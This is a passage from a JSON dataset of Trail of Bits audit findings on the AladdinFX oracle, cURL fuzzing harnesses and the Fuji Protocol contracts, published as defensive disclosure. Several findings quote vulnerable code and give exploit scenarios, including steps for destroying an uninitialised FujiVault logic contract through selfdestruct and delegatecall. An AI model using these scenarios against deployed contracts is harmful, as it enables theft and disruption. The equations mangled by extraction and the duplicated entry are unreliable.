            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of validation of Chainlink price feed answers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf",
        "body": "The validation of the price returned by Chainlink is incomplete, which means that incorrect prices could be used in the protocol. This could lead to loss of funds or otherwise cause internal accounting errors that might break the correct functioning of the protocol. 46 function _readSpotPriceByChainlink ( bytes32 encoding ) internal view returns ( uint256 ) { address aggregator ; uint256 scale ; uint256 heartbeat ; 47 48 49 50 assembly { 51 aggregator := shr( 96 , encoding) 52 scale := and(shr( 32 , encoding), 0xffffffffffffffff ) 53 heartbeat := and(encoding, 0xffffffff ) 54 } 55 (, int256 answer , , uint256 updatedAt , ) = AggregatorV3Interface(aggregator).latestRoundData(); 56 57 58 } if ( block.timestamp - updatedAt > heartbeat) revert( \"expired\" ); return uint256 (answer) * scale; Figure 3.1: The _readSpotPriceByChainlink function in FxSpotOracleBase.sol#L46-L58 Because the Chainlink-returned price is of type int256 , the following two scenarios could happen:   The price feed answer could be a negative integer. First o, this is highly unlikely for the particular price feeds used by f(x). However, if a negative integer is returned, it will be unsafely cast to an unsigned integer ( uint256 ) on line 57 of _readSpotPriceByChainlink . This will likely lead to a revert because the unsigned value of a cast signed negative integer will likely be very high, but it might also lead to the use of an incorrect price. A Chainlink price feed can also return zero as the answer. In this case, the isValid Boolean will be set to false , which will ensure the incorrect price is not actually used, as shown in gure 3.2. external returns ( function getPrice () 103 104 105 view 106 override 107 108 109 110 111 112 ) 113 { 114 twap = _getLSDUSDTwap(); 115 (minPrice, maxPrice) = _getLSDMinMaxPrice(twap); 116 unchecked { 117 isValid = (maxPrice - minPrice) * PRECISION < maxPriceDeviation * bool isValid , uint256 twap , uint256 minPrice , uint256 maxPrice minPrice ; 118 } 119 } Figure 3.2: The getPrice function in FxLSDOracleV2Base.sol#L103-L119 Exploit Scenario The Chainlink price feed returns a negative price, which when cast to an unsigned integer is considered valid. As a result, an incorrect price is used. Recommendations Short term, add a check inside the _readSpotPriceByChainlink function that ensures answer is greater than 0 . Long term, add validation of returned results from all external sources.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Lack of validation of updates to system conguration parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf",
        "body": "Several conguration functions (gures 4.14.3) do not validate that updates to conguration parameters actually result in a change in value. Although setting a parameter to its current value is benign, it may obscure a logical error in a peripheral program that would be readily identiable if the update were to revert and raise an alarm. uint256 oldMaxPriceDeviation = maxPriceDeviation; function _updateMaxPriceDeviation ( uint256 newMaxPriceDeviation ) private { 108 109 110 maxPriceDeviation = newMaxPriceDeviation; 111 112 emit UpdateMaxPriceDeviation(oldMaxPriceDeviation, newMaxPriceDeviation); 113 } Figure 4.1: The _updateMaxPriceDeviation function in FxBTCDerivativeOracleBase.sol#L108-L113 uint256 oldCoolingOffPeriod = coolingOffPeriod; function _updateCoolingOffPeriod ( uint256 _newCoolingOffPeriod ) private { 129 130 131 coolingOffPeriod = _newCoolingOffPeriod; 132 133 emit UpdateCoolingOffPeriod(oldCoolingOffPeriod, _newCoolingOffPeriod); 134 } Figure 4.2: The _updateCoolingOffPeriod function in LeveragedTokenV2.sol#L129-L134 130 function updateReader ( uint256 poolType , address newReader ) external onlyOwner { address oldReader = readers[poolType]; 131 132 readers[poolType] = newReader; 133 134 emit UpdateReader(poolType, oldReader, newReader); 135 } Figure 4.3: The updateReader function in SpotPriceOracle.sol#L130-L135 Recommendations Short term, add validation to these functions to require that the new value is not equal to the previous value. Long term, add validation to all conguration functions to ensure they either perform a conguration state update or cause a revert. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. OSS-Fuzz coverage silently dropped signicantly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf",
        "body": "Between November 30, 2022 and December 1, 2022 , the fuzzing coverage for cURL in OSS-Fuzz dropped signicantly. By the end of November, cURL had over 50% line coverage and over 67% function coverage; however, in December, cURL fuzz runs reected a low 6.62% line coverage and 10.18% function coverage. Reviewing build logs and Git change history, we observed that this occurred after an OpenSSL version upgrade. The new OpenSSL version started installing the libssl.a static library on a dierent directory, lib64 , instead of the traditional lib folder. The cURL fuzz scripts did not expect nor support this alternate location and therefore built cURL without SSL support, which broke several expectations in the fuzzing harnesses. This signicant loss of coverage went undetected for over a year, as we observed that the coverage had not recovered by the time we started this engagement in December 2023. The team submitted a pull request to the curl_fuzzer repository to x the issue. Once it was merged, we observed the coverage started to increase again starting on December 15. By December 20, 2023 , coverage was up again and near the November 2022 values, with a 48.83% line coverage and 65.73% function coverage of cURL code. Recommendations Short term, frequently monitor coverage changes over time, especially after changes are merged in the curl_fuzzer repository. If a regression is identied, act as needed to resolve it and restore the fuzzing functionality. Consider modifying the harnesses to immediately fail if an operation that is supposed to always work, such as setting a static cURL option, fails. Long term, implement an automated system to monitor coverage changes in OSS-Fuzz and alert the maintainers if signicant changes are detected. Integrate tests in the curl_fuzzer CI to compare corpus coverage before and after changes, in order to detect regressions earlier on. 2. curl_fuzzer is ine\u0000ective Severity: Informational Diculty: Undetermined Type: Conguration Finding ID: TOB-CURLH3-2 Target: curl_fuzzer/curl_fuzzer.cc",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. OSS-Fuzz coverage silently dropped signicantly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf",
        "body": "Between November 30, 2022 and December 1, 2022 , the fuzzing coverage for cURL in OSS-Fuzz dropped signicantly. By the end of November, cURL had over 50% line coverage and over 67% function coverage; however, in December, cURL fuzz runs reected a low 6.62% line coverage and 10.18% function coverage. Reviewing build logs and Git change history, we observed that this occurred after an OpenSSL version upgrade. The new OpenSSL version started installing the libssl.a static library on a dierent directory, lib64 , instead of the traditional lib folder. The cURL fuzz scripts did not expect nor support this alternate location and therefore built cURL without SSL support, which broke several expectations in the fuzzing harnesses. This signicant loss of coverage went undetected for over a year, as we observed that the coverage had not recovered by the time we started this engagement in December 2023. The team submitted a pull request to the curl_fuzzer repository to x the issue. Once it was merged, we observed the coverage started to increase again starting on December 15. By December 20, 2023 , coverage was up again and near the November 2022 values, with a 48.83% line coverage and 65.73% function coverage of cURL code. Recommendations Short term, frequently monitor coverage changes over time, especially after changes are merged in the curl_fuzzer repository. If a regression is identied, act as needed to resolve it and restore the fuzzing functionality. Consider modifying the harnesses to immediately fail if an operation that is supposed to always work, such as setting a static cURL option, fails. Long term, implement an automated system to monitor coverage changes in OSS-Fuzz and alert the maintainers if signicant changes are detected. Integrate tests in the curl_fuzzer CI to compare corpus coverage before and after changes, in order to detect regressions earlier on.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. curl_fuzzer is ine\u0000ective ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf",
        "body": "The curl_fuzzer harness displays signicantly worse coverage than other similar harnesses like curl_fuzzer_http . Upon inspecting the harness code and coverage logs, we observed that the harness consistently fails to set the allowed protocols list, as highlighted in gure 2.1. This list is overly broad, and contains protocols that cURL is not built to support, causing the setopt call to fail every time. The harness cannot proceed beyond this point and therefore does not achieve any interesting coverage. int fuzz_set_allowed_protocols (FUZZ_DATA *fuzz) { int rc = 0 ; const char *allowed_protocols = \"\" ; #ifdef FUZZ_PROTOCOLS_ALL /* Do not allow telnet currently as it accepts input from stdin. */ allowed_protocols = \"dict,file,ftp,ftps,gopher,gophers,http,https,imap,imaps,\" \"ldap,ldaps,mqtt,pop3,pop3s,rtmp,rtmpe,rtmps,rtmpt,rtmpte,rtmpts,\" \"rtsp,scp,sftp,smb,smbs,smtp,smtps,tftp\" ; #endif /* (...) */ FTRY(curl_easy_setopt(fuzz->easy, CURLOPT_PROTOCOLS_STR, allowed_protocols)); EXIT_LABEL : return rc; } Figure 2.1: The fuzzer harness fails to congure the allowed protocols ( curl-fuzzer/curl_fuzzer.cc#505577 ) Recommendations Short term, adjust the allowed_protocols list so that it contains only protocols supported by the cURL build under test. Long term, review the existing harnesses as time passes and cURL features change to ensure that they are still exercising code paths as expected. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Anyone can destroy the FujiVault logic contract if its initialize function was not called during deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Anyone can destroy the FujiVault logic contract if its initialize function has not already been called. Calling initialize on a logic contract is uncommon, as usually nothing is gained by doing so. The deployment script does not call initialize on any logic contract. As a result, the exploit scenario detailed below is possible after deployment. This issue is similar to a bug in AAVE that found in 2020. OpenZeppelins hardhat-upgrades plug-in protects against this issue by disallowing the use of selfdestruct or delegatecall on logic contracts. However, the Fuji Protocol team has explicitly worked around these protections by calling delegatecall in assembly, which the plug-in does not detect. Exploit Scenario The Fuji contracts are deployed, but the initialize functions of the logic contracts are not called. Bob, an attacker, deploys a contract to the address alwaysSelfdestructs, which simply always executes the selfdestruct opcode. Additionally, Bob deploys a contract to the address alwaysSucceeds, which simply never reverts. Bob calls initialize on the FujiVault logic contract, thereby becoming its owner. To make the call succeed, Bob passes 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE as the value for the _collateralAsset and _borrowAsset parameters. He then calls FujiVaultLogic.setActiveProvider(alwaysSelfdestructs), followed by FujiVault.setFujiERC1155(alwaysSucceeds) to prevent an additional revert in the next and nal call. Finally, Bob calls FujiVault.deposit(1), sending 1 wei. This triggers a delegatecall to alwaysSelfdestructs, thereby destroying the FujiVault logic contract and making the protocol unusable until its proxy contract is upgraded. 14 Fuji Protocol Because OpenZeppelins upgradeable contracts do not check for a contracts existence before a delegatecall (TOB-FUJI-003), all calls to the FujiVault proxy contract now succeed. This leads to exploits in any protocol integrating the Fuji Protocol. For example, a call that should repay all debt will now succeed even if no debt is repaid. Recommendations Short term, do not use delegatecall to implement providers. See TOB-FUJI-002 for more information. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 15 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Providers are implemented with delegatecall ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The system uses delegatecall to execute an active provider's code on a FujiVault, making the FujiVault the holder of the positions in the borrowing protocol. However, delegatecall is generally error-prone, and the use of it introduced the high-severity nding TOB-FUJI-001. It is possible to make a FujiVault the holder of the positions in a borrowing protocol without using delegatecall. Most borrowing protocols include a parameter that species the receiver of tokens that represent a position. For borrowing protocols that do not include this type of parameter, tokens can be transferred to the FujiVault explicitly after they are received from the borrowing protocol; additionally, the tokens can be transferred from the FujiVault to the provider before they are sent to the borrowing protocol. These solutions are conceptually simpler than and preferred to the current solution. Recommendations Short term, implement providers without the use of delegatecall. Set the receiver parameters to the FujiVault, or transfer the tokens corresponding to the position to the FujiVault. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 16 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Lack of contract existence check on delegatecall will result in unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The VaultControlUpgradeable and Proxy contracts use the delegatecall proxy pattern. If the implementation contract is incorrectly set or self-destructed, the contract may not be able to detect failed executions. The VaultControlUpgradeable contract includes the _execute function, which users can invoke indirectly to execute a transaction to a _target address. This function does not check for contract existence before executing the delegatecall (gure 3.1). /** * @dev Returns byte response of delegatcalls */ function _execute(address _target, bytes memory _data) internal whenNotPaused returns (bytes memory response) { /* solhint-disable */ assembly { let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 0) let size := returndatasize() response := mload(0x40) mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(response, size) returndatacopy(add(response, 0x20), 0, size) switch iszero(succeeded) case 1 { // throw if delegatecall failed revert(add(response, 0x20), size) } } /* solhint-disable */ } 17 Fuji Protocol Figure 3.1: fuji-protocol/contracts/abstracts/vault/VaultBaseUpgradeable.sol#L93-L11 5 The Proxy contract, deployed by the @openzeppelin/hardhat-upgrades library, includes a payable fallback function that invokes the _delegate function when proxy calls are executed. This function is also missing a contract existence check (gure 3.2). /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internall call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } Figure 3.2: Proxy.sol#L16-L41 A delegatecall to a destructed contract will return success (gure 3.3). Due to the lack of contract existence checks, a series of batched transactions may appear to be successful even if one of the transactions fails. The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 3.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Eve upgrades the proxy to point to an incorrect new implementation. As a result, each 18 Fuji Protocol delegatecall returns success without changing the state or executing code. Eve uses this to scam users. Recommendations Short term, implement a contract existence check before any delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from using these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability 19 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. FujiVault.setFactor is unnecessarily complex and does not properly handle invalid input ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The FujiVault contracts setFactor function sets one of four state variables to a given value. Which state variable is set depends on the value of a string parameter. If an invalid value is passed, setFactor succeeds but does not set any of the state variables. This creates edge cases, makes writing correct code more dicult, and increases the likelihood of bugs. function setFactor( uint64 _newFactorA, uint64 _newFactorB, string calldata _type ) external isAuthorized { bytes32 typeHash = keccak256(abi.encode(_type)); if (typeHash == keccak256(abi.encode(\"collatF\"))) { collatF.a = _newFactorA; collatF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"safetyF\"))) { safetyF.a = _newFactorA; safetyF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"bonusLiqF\"))) { bonusLiqF.a = _newFactorA; bonusLiqF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"protocolFee\"))) { protocolFee.a = _newFactorA; protocolFee.b = _newFactorB; } } Figure 4.1: FujiVault.sol#L475-494 Exploit Scenario A developer on the Fuji Protocol team calls setFactor from another contract. He passes a type that is not handled by setFactor. As a result, code that is expected to set a state variable does nothing, resulting in a more severe vulnerability. 20 Fuji Protocol Recommendations Short term, replace setFactor with four separate functions, each of which sets one of the four state variables. Long term, avoid string constants that simulate enumerations, as they cannot be checked by the typechecker. Instead, use enums and ensure that any code that depends on enum values handles all possible values. 21 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Preconditions specied in docstrings are not checked by functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The docstrings of several functions specify preconditions that the functions do not automatically check for. For example, the docstring of the FujiVault contracts setFactor function contains the preconditions shown in gure 5.1, but the functions body does not contain the corresponding checks shown in gure 5.2. * For safetyF; Sets Safety Factor of Vault, should be > 1, a/b * For collatF; Sets Collateral Factor of Vault, should be > 1, a/b Figure 5.1: FujiVault.sol#L469-470 require(safetyF.a > safetyF.b); ... require(collatF.a > collatF.b); Figure 5.2: The checks that are missing from FujiVault.setFactor Additionally, the docstring of the Controller contracts doRefinancing function contains the preconditions shown in gure 5.3, but the functions body does not contain the corresponding checks shown in gure 5.4. * @param _ratioB: _ratioA/_ratioB <= 1, and > 0 Figure 5.3: Controller.sol#L41 require(ratioA > 0 && ratioB > 0); require(ratioA <= ratioB); Figure 5.4: The checks that are missing from Controller.doRefinancing Exploit Scenario The setFactor function is called with values that violate its documented preconditions. Because the function does not check for these preconditions, unexpected behavior occurs. 22 Fuji Protocol Recommendations Short term, add checks for preconditions to all functions with preconditions specied in their docstrings. Long term, ensure that all documentation and code are in sync. 23 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. The FujiERC1155.burnBatch function implementation is incorrect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The FujiERC1155 contracts burnBatch function deducts the unscaled amount from the user's balance and from the total supply of an asset. If the liquidity index of an asset (index[assetId]) is dierent from its initialized value, the execution of burnBatch could result in unintended arithmetic calculations. Instead of deducting the amount value, the function should deduct the amountScaled value. function burnBatch( address _account, uint256[] memory _ids, uint256[] memory _amounts ) external onlyPermit { require(_account != address(0), Errors.VL_ZERO_ADDR_1155); require(_ids.length == _amounts.length, Errors.VL_INPUT_ERROR); address operator = _msgSender(); uint256 accountBalance; uint256 assetTotalBalance; uint256 amountScaled; for (uint256 i = 0; i < _ids.length; i++) { uint256 amount = _amounts[i]; accountBalance = _balances[_ids[i]][_account]; assetTotalBalance = _totalSupply[_ids[i]]; amountScaled = _amounts[i].rayDiv(indexes[_ids[i]]); require(amountScaled != 0 && accountBalance >= amountScaled, Errors.VL_INVALID_BURN_AMOUNT); _balances[_ids[i]][_account] = accountBalance - amount; _totalSupply[_ids[i]] = assetTotalBalance - amount; } emit TransferBatch(operator, _account, address(0), _ids, _amounts); } Figure 6.1: FujiERC1155.sol#L218-247 24 Fuji Protocol Exploit Scenario The burnBatch function is called with an asset for which the liquidity index is dierent from its initialized value. Because amount was used instead of amountScaled, unexpected behavior occurs. Recommendations Short term, revise the burnBatch function so that it uses amountScaled instead of amount when updating a users balance and the total supply of an asset. Long term, use the burn function in the burnBatch function to keep functionality consistent. 25 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Error in the white papers equation for the cost of renancing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The white paper uses the following equation (equation 4) to describe how the cost of renancing is calculated:    =  +   +   +   +     is the amount of debt to be renanced and is a summand of the equation. This is incorrect, as it implies that the renancing cost is always greater than the amount of debt to be renanced. A correct version of the equation could be   is an amount, or     =  +    +  +  +   = +   +   *      , in which  is a  , in which  percentage. Recommendations Short term, x equation 4 in the white paper. Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 26 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Errors in the white papers equation for index calculation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The white paper uses the following equation (equation 1) to describe how the index for a given token at timestamp is calculated:    =  1 + ( 1 )/    1  is the amount of the given token that the Fuji Protocol owes the provider (the borrowing  protocol) at timestamp . The index is updated only when the balance changes through the accrual of interest, not when the balance changes through borrowing or repayment operations. This means that    is always negative, which is incorrect, as  should calculate the )/    ( 1 1 1 interest rate since the last index update. *  3 *  2 * ... *  . A user's current balance is computed by taking the users initial stored  The index represents the total interest rate since the deployment of the protocol. It is the product of the various interest rates accrued on the active providers during the lifetime of the protocol (measured only during state-changing interactions with the provider):  1 balance, multiplying it by the current index, and dividing it by the index at the time of the creation of that user's position. The division operation ensures that the user will not owe interest that accrued before the creation of the users position. The index provides an ecient way to keep track of interest rates without having to update each user's balance separately, which would be prohibitively expensive on Ethereum. However, interest is compounded through multiplication, not addition. The formula should use the product sign instead of the plus sign. 27 Fuji Protocol Exploit Scenario Alice decides to use the Fuji Protocol after reading the white paper. She later learns that calculations in the white paper do not match the implementations in the protocol. Because Alice allocated her funds based on her understanding of the specication, she loses funds. Recommendations Short term, replace equation 1 in the white paper with a correct and simplied version. For more information on the simplied version, see nding TOB-FUJI-015.   =  1 / *   1 Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 28 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. FujiERC1155.setURI does not adhere to the EIP-1155 specication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The FujiERC1155 contracts setURI function does not emit the URI event. /** * @dev Sets a new URI for all token types, by relying on the token type ID */ function setURI(string memory _newUri) public onlyOwner { _uri = _newUri; } Figure 9.1: FujiERC1155.sol#L266-268 This behavior does not adhere to the EIP-1155 specication, which states the following: Changes to the URI MUST emit the URI event if the change can be expressed with an event (i.e. it isnt dynamic/programmatic). Figure 9.2: A snippet of the EIP-1155 specication Recommendations Short term, revise the setURI function so that it emits the URI event. Long term, review the EIP-1155 specication to verify that the contracts adhere to the standard. References  EIP-1155 29 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Partial renancing operations can break the protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The white paper documents the Controller contracts ability to perform partial renancing operations. These operations move only a fraction of debt and collateral from one provider to another to prevent unprotable interest rate slippage. However, the protocol does not correctly support partial renancing situations in which debt and collateral are spread across multiple providers. For example, payback and withdrawal operations always interact with the current provider, which might not contain enough funds to execute these operations. Additionally, the interest rate indexes are computed only from the debt owed to the current provider, which might not accurately reect the interest rate across all providers. Exploit Scenario An executor performs a partial renancing operation. Interest rates are computed incorrectly, resulting in a loss of funds for either the users or the protocol. Recommendations Short term, disable partial renancing until the protocol supports it in all situations. Long term, ensure that functionality that is not fully supported by the protocol cannot be used by accident. 30 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Native support for ether increases the codebases complexity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The protocol supports ERC20 tokens and Ethereums native currency, ether. Ether transfers follow dierent semantics than token transfers. As a result, many functions contain extra code, like the code shown in gure 11.1, to handle ether transfers. if (vAssets.borrowAsset == ETH) { require(msg.value >= amountToPayback, Errors.VL_AMOUNT_ERROR); if (msg.value > amountToPayback) { IERC20Upgradeable(vAssets.borrowAsset).univTransfer( payable(msg.sender), msg.value - amountToPayback ); } } else { // Check User Allowance require( IERC20Upgradeable(vAssets.borrowAsset).allowance(msg.sender, address(this)) >= amountToPayback, Errors.VL_MISSING_ERC20_ALLOWANCE ); Figure 11.1: FujiVault.sol#L319-333 This extra code increases the codebases complexity. Furthermore, functions will behave dierently depending on their arguments. Recommendations Short term, replace native support for ether with support for ERC20 WETH. This will decrease the complexity of the protocol and the likelihood of bugs. 31 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. Missing events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol 13. Indexes are not updated before all operations that require up-to-date indexes Severity: High Diculty: Low Type: Undened Behavior Finding ID: TOB-FUJI-013 Target: FujiVault.sol, FujiERC1155.sol, FLiquidator.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. No protection against missing index updates before operations that depend on up-to-date indexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. This function must be called before all operations that read indexes (TOB-FUJI-013). However, the protocol does not protect against situations in which indexes are not updated before they are read; these situations could result in incorrect accounting. Exploit Scenario Developer Bob adds a new operation that reads indexes, but he forgets to add a call to updateF1155Balances. As a result, the new operation uses outdated index values, which causes incorrect accounting. Recommendations Short term, redesign the index calculations so that they provide protection against the reading of outdated indexes. For example, the index calculation process could keep track of the last index updates block number and access indexes exclusively through a getter, which updates the index automatically, if it has not already been updated for the current block. Since ERC-1155s balanceOf and totalSupply functions do not allow side eects, this solution would require the use of dierent functions internally. Long term, use defensive coding practices to ensure that critical operations are always executed when required. 34 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Formula for index calculation is unnecessarily complex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol 16. Flashers initiateFlashloan function does not revert on invalid ashnum values Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-FUJI-016 Target: Flasher.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "17. Docstrings do not reect functions implementations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The docstring of the FujiVault contracts withdraw function states the following: * @param _withdrawAmount: amount of collateral to withdraw * otherwise pass -1 to withdraw maximum amount possible of collateral (including safety factors) Figure 17.1: FujiVault.sol#L188-189 However, the maximum amount is withdrawn on any negative value, not only on a value of -1. A similar inconsistency between the docstring and the implementation exists in the FujiVault contracts payback function. Recommendations Short term, adjust the withdraw and payback functions docstrings or their implementations to make them match. Long term, ensure that docstrings always match the corresponding functions implementation. 38 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "18. Harvesters getHarvestTransaction function does not revert on invalid _farmProtocolNum and harvestType values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
